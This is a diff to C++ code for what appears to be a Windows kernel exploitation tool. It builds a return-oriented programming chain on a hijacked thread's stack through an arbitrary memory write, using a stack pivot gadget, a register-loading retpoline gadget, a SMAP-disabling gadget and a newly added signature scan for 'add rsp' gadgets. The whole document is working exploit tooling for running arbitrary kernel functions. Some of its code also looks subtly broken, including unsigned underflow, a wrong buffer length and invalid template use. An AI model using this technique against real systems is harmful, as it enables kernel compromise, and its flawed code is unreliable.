@@ -157,8 +157,20 @@ private:
 		_In_ kAddress Function,
 		_In_ kAddress CallingThread,
 		Byte** NewStack,
-		_In_ std::tuple<Args...> Arguments
-	) {
+		_In_ std::tuple<Args...> Arguments ) 
+	{
+		//
+		// We're restricted in the number of arguments we have, so before we're doing anything let's make sure
+		// we're covered.
+		//
+		
+		constexpr auto NumberOfArguments = std::tuple_size<decltype(Arguments)>::value;
+		if (NumberOfArguments - 4 > m_MaxAllowedStackArguments) {
+			LOG_FAIL( "Cannot call function 0x%llx with 0x%llx arguments, more than the allowed 0x%llx",
+				Function, NumberOfArguments, m_MaxAllowedStackArguments + 4 );
+			throw std::runtime_error( "Invalid number of arguments" );
+		}
+
 
 		std::vector<Byte> previousStackData;
 		kAddress rsp = GetNtWaitForSingleObjectReturnAddress(CallingThread, previousStackData);
@@ -180,29 +192,6 @@ private:
 		// go down in the stack enough and assume that the called function doesn't do a lot lol
 		//
 
-		//
-		// Disable SMAP so we could pivot into user stack. Recall the gadget is
-		// 
-		// KiQuantumEnd:
-		// ...
-		// clac
-		// jmp     loc_14021B880
-		// 
-		// loc_14021B880:
-		// add     rsp, 0B8h
-		// pop     r15
-		// pop     r14
-		// pop     r13
-		// pop     r12
-		// pop     rdi
-		// pop     rsi
-		// pop     rbx
-		// pop     rbp
-		// retn
-		// 
-		// Note: might come later to fuck us :(
-		//
-
 		//PUT_STACK(m_Gadgets.DisableSmap);
 		//
 		//rsp += 0xb8;
@@ -222,20 +211,6 @@ private:
 
 		PUT_STACK( m_Gadgets.PopRbp );
 		PUT_STACK( newRsp );
-
-
-		//
-		// Stack pivot gadget. Looks as follows:
-		// 
-		// RtlRestoreContext:
-		// ...
-		// .text:00000001404081F6                  mov     rsp, rbp
-		// .text:00000001404081F9                  add     rsp, 30h
-		// .text:00000001404081FD                  pop     rdi
-		// .text:00000001404081FE                  pop     rsi
-		// .text:00000001404081FF                  pop     rbp
-		// .text:0000000140408200                  retn
-		//
 
 		PUT_STACK(m_Gadgets.StackPivot);
 		
@@ -262,30 +237,27 @@ private:
 		kAddress pRbpValue = rsp; 
 		PUT_STACK(0x1337);	// pop rbp
 
-		//
-		// We'll use the retpoline gadget. Recall it looks as follows:
-		//
-		// __guard_retpoline_exit_indirect_rax:
-		//  ...
-		//	mov rax, [rsp+0x20]
-		//	mov rcx, [rsp+0x28]
-		//	mov rdx, [rsp+0x30]
-		//	mov r8,  [rsp+0x38]
-		//	mov r9,  [rsp+0x40]
-		//	add rsp, 0x48
-		//  jmp rax
-		//
-
 		PUT_STACK(m_Gadgets.Retpoline);
 
 		rsp += 0x20;
+		
+		//
+		// If we have more than 4 arguments, we need to get ourselves a bit more stack space,
+		// so instead of jumping to the function after the retpoline gadget,
+		// we'll pivot to a slightly lower address.
+		//
 
-		// add jump target: Function
-		PUT_STACK(Function);
+		constexpr bool HaveStackArguments = NumberOfArguments > 4;
+
+		// add jump target
+		if constexpr (HaveStackArguments) {
+			PUT_STACK( m_Gadgets.AddRsp.Address );
+		}
+		else {
+			PUT_STACK( Function );
+		}
 		
 		// add register arguments
-		constexpr auto NumberOfArguments = std::tuple_size<decltype(Arguments)>::value;
-
 		auto beforeArgs = rsp;
 
 		if constexpr (NumberOfArguments >= 1) PUT_STACK(std::get<0>(Arguments));
@@ -294,18 +266,23 @@ private:
 		if constexpr (NumberOfArguments >= 4) PUT_STACK(std::get<3>(Arguments));
 
 		rsp = beforeArgs + 0x20;
-		// add remaining stack arguments
 		
-		//rsp += 0x20; // save shadow space
-
-		if constexpr (NumberOfArguments >= 5) {
+		// add remaining stack arguments
+		if constexpr (NumberOfArguments >= 5) 
+		{
 			auto indiciesOfRemainingArgs = std::make_index_sequence<NumberOfArguments - 4>{};
 			Qword remaining[] = { Qword(std::get<indiciesOfRemainingArgs>(Arguments))... };
 
-			g_Rw->WriteBuffer( rsp, std::span<Qword>( remaining, NumberOfArguments ) );
-			//std::memcpy(rsp, remaining, sizeof(remaining));
+			//
+			// Write remaining arguments. The stack looks something like this right now:
+			//
+			//
+			
+			kAddress argumentsStart = rsp - sizeof( remaining );
+			g_Rw->WriteBuffer( argumentsStart, std::span<Qword>( remaining, NumberOfArguments ) );
 
-			rsp += sizeof(remaining);
+			rsp += m_Gadgets.AddRsp.Offset;
+			PUT_STACK( Function );
 		}
 
 		// go back to where we've been - and return to user mode lol
@@ -390,6 +367,41 @@ private:
 		return std::nullopt;
 	}
 
+	static std::optional<kAddress> FindAddRspGadget( Byte& Offset )
+	{
+		std::optional<kAddress> gadgetAddress = std::nullopt;
+		Byte maxOffset = 0;
+		
+		//
+		// We want to support at least (0x60 - 0x20) / 8 = 8 stack arguments.
+		//		
+		//	Note: we're subtracting 0x20 for the shadow space, and dividing by 8 because stack. 
+		//	See OverrideThreadStackWithFunctionCall for more info.
+		//
+		constexpr Byte MinAllowedRspOffset = 0x60;
+
+		// add rsp, ?; ret
+		auto addRspRet = Sig::FromHex( "48 83 C4 * C3" );
+		g_KernelBinary->ForEveryCodeSignatureOccurrence( addRspRet,
+			[&]( const Byte* Occurrence) -> bool {
+				Byte rspOffset = *(Occurrence + 3);
+
+				// irrelevant, continue search
+				if (rspOffset < MinAllowedRspOffset) return true;
+
+				if (rspOffset > maxOffset) {
+					gadgetAddress = g_KernelBinary->MappedToKernel(Occurrence);
+					maxOffset = rspOffset;
+				}
+
+				return true;
+			} );
+
+		Offset = maxOffset;
+
+		return gadgetAddress;
+	}
+
 	bool InitializeGadgets()
 	{
 		LOG_DEBUG("Finding gadgets...");
@@ -417,6 +429,19 @@ private:
 
 		LOG_DEBUG( "Found pop rbp gadget at 0x%llx", popRbp.value() );
 
+		Byte rspOffset = 0;
+		auto addRspGadget = FindAddRspGadget( rspOffset );
+		if (!addRspGadget) {
+			LOG_FAIL( "Failed to find add rsp gadget with sufficent space for stack arguments" );
+		}
+		
+		LOG_DEBUG( "Found add rsp, ? gadget at 0x%llx, offset=0x%x", addRspGadget.value(), rspOffset);
+
+		m_Gadgets.AddRsp.Address = addRspGadget.value();
+		m_Gadgets.AddRsp.Offset = rspOffset;
+		m_MaxAllowedStackArguments = (rspOffset - 0x20) / sizeof( Qword );
+		LOG_INFO( "Restricted to %d stack arguments at most", m_MaxAllowedStackArguments );
+
 		//auto smapGadget = TryFindSmapGadget();
 		//if (!smapGadget) return false;
 		//m_Gadgets.DisableSmap = smapGadget.value();
@@ -434,10 +459,80 @@ private:
 	std::condition_variable m_QueueUpdateVariable;
 	std::atomic<bool> m_TerminateWorker;
 
-	struct {
+	struct Gadgets_t {
+
+		//
+		// Used to set calling registers.
+		//
+		// __guard_retpoline_exit_indirect_rax:
+		//  ...
+		//	mov rax, [rsp+0x20]
+		//	mov rcx, [rsp+0x28]
+		//	mov rdx, [rsp+0x30]
+		//	mov r8,  [rsp+0x38]
+		//	mov r9,  [rsp+0x40]
+		//	add rsp, 0x48
+		//  jmp rax
+		//
 		kAddress Retpoline;
+
+		//
+		// Stack pivot gadget. Looks as follows:
+		// 
+		// RtlRestoreContext:
+		// ...
+		// mov     rsp, rbp
+		// add     rsp, 30h
+		// pop     rdi
+		// pop     rsi
+		// pop     rbp
+		// retn
+		//
 		kAddress StackPivot;
+
+		//
+		// Disable SMAP so we could pivot into user stack. Recall the gadget is
+		// 
+		// KiQuantumEnd:
+		// ...
+		// clac
+		// jmp     loc_14021B880
+		// 
+		// loc_14021B880:
+		// add     rsp, 0B8h
+		// pop     r15
+		// pop     r14
+		// pop     r13
+		// pop     r12
+		// pop     rdi
+		// pop     rsi
+		// pop     rbx
+		// pop     rbp
+		// retn
+		// 
+		// Note: might come later to fuck us :(
+		//
 		kAddress DisableSmap;
+
+		//
+		// Simply pop rbp; ret; 
+		//
 		kAddress PopRbp;
+
+		//
+		// Some gadget of the form add rsp, ?; ret
+		//
+		struct {
+			// Gadget address
+			kAddress Address;
+			
+			// Offset by which we're adding rsp
+			Byte Offset;
+		} AddRsp;
+
 	} m_Gadgets;
+	
+	// Max allowed stack arguments, restricted by availibility of add rsp,? gadgets
+	// in local ntos.
+	Dword m_MaxAllowedStackArguments;
 };
